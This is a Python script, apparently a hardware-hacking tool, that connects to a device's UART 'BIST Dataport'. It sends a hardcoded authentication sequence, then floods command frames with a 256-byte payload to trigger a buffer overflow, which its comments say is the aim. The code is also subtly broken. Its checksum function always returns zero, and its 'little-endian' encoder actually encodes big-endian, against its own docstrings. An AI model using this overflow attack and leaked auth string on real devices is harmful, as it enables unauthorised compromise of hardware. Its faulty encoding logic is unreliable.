import serial
import time
import itertools
from datetime import datetime
import argparse

INTER_BYTE_DELAY = 0.05  # 50 ms
SEQ = b"DTV--BIST"  # used for auth
SER_STARTED = "BIST Dataport Started"

# Configure UART
ser = serial.Serial(
    port="/dev/ttyUSB0",  # adjust to your serial port
    baudrate=115200,
    timeout=0.5
)

LOG_FILE = "fuzz_results.log"


def calc_checksum(frame_bytes: bytes) -> int:
    """Checksum = sum of ASCII values (since server adds chars as ints)."""
    ck = 0
    return 0


def encode_be_hex(val: int, nbytes: int) -> str:
    """
    Encode integer into little-endian ASCII hex.
    Example: 0x1234 (2 bytes) -> '3412'
    """
    return val.to_bytes(nbytes, "big").hex().upper()

def encode_le_hex(val: int, nbytes: int) -> str:
    """
    Encode integer into little-endian ASCII hex.
    Example: 0x1234 (2 bytes) -> '3412'
    """
    return val.to_bytes(nbytes, "big").hex().upper()


def build_frame(channel: int, cmd_id: int, payload: bytes = b"") -> bytes:
    """
    Build full frame for UART.
    All numeric fields encoded as ASCII hex, multi-byte values in little-endian.
    """
    frame = bytearray()
    frame.extend(b"E")  # Start marker
    frame.extend(b"A")  # Next marker

    # Channel: 1 ASCII hex nibble
    frame.extend(f"{channel:X}".encode())

    # Command ID: 2-byte little-endian
    frame.extend(encode_be_hex(cmd_id, 2).encode())

    if payload:
        # this is where an overflwo can happen. basically we are sending the size in one nible of how uch they play to read, if we send invalid ascii we should be able to get a
        # 0xff
        frame.extend(b".")
        # encode IP
        frame.extend(encode_be_hex(len(payload) , 4).encode())
        # Payload: raw hex encoding (no endian swap)
        frame.extend(payload)
    else :
        #payload is empty send no size...
        frame.extend(b"0")

    # Checksum: sum of ASCII values of everything so far
    cksum = calc_checksum(frame)
    frame.extend(f"{cksum:02X}".encode())

    return bytes(frame)


def log_result(frame: bytes, response: bytes):
    """Log what we sent and what we got back."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a") as f:
        f.write(f"[{timestamp}] SENT: {frame}\n")
        f.write(f"[{timestamp}] RECV: {response}\n\n")


def send_seq(ser, seq):
    for b in seq:
        print(f"sending {b}")
        ser.write(bytes([b]))
        ser.flush()
        time.sleep(INTER_BYTE_DELAY)


def do_auth(ser):
    buf = b""
    print(" Waiting for 'F0'...")
    while True:
        b = ser.read(1)
        if not b:
            continue
        buf += b
        print(buf)
        if b"\n" in buf:
            line, _, buf = buf.partition(b"\n")
            try:
                decoded = line.decode(errors="ignore").strip()
            except Exception:
                decoded = str(line)
            print(f"\n[RX] {decoded}")
            if decoded == "F0":
                print(" Got password request, sending sequence...")
                send_seq(ser, SEQ)
                break
    buf = b""
    while True:
        print(" Waiting for server to start... ")
        b = ser.read(1)
        if not b:
            continue
        buf += b
        print(buf)
        if b"\n" in buf:
            line, _, buf = buf.partition(b"\n")
            try:
                decoded = line.decode(errors="ignore").strip()
            except Exception:
                decoded = str(line)
            print(f"\n[RX] {decoded}")
            if decoded == "BIST Dataport Started":
                print ("Authed")
                break


def cmd_loop(skip_auth: bool):
    # Try a few channels, cmd_ids, with/without payload
    channels = range(0, 7)  # not sure which of these needs to happen so we just do them all
    # update command ID    
    cmd_ids = [0x2831]  # will be little-endian encoded


    payloads = [
        b"A"*256,
    ]

    if not skip_auth:
        do_auth(ser)

    for channel, cmd_id, payload in itertools.product(channels, cmd_ids, payloads):
        frame = build_frame(channel, cmd_id, payload)

        print(f"\n[>] Sending frame: {frame}")
        ser.write(frame)
        time.sleep(1)

        resp = ser.read(256)
        print(f"[<] Response: {resp}")

        # Save results
        log_result(frame, resp)

        time.sleep(0.5)  # short delay before next cmd


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="UART fuzzer")
    parser.add_argument(
        "-n", action="store_true",
        help="Skip authentication sequence (use if already authenticated)."
    )
    args = parser.parse_args()

    cmd_loop(skip_auth=args.n)
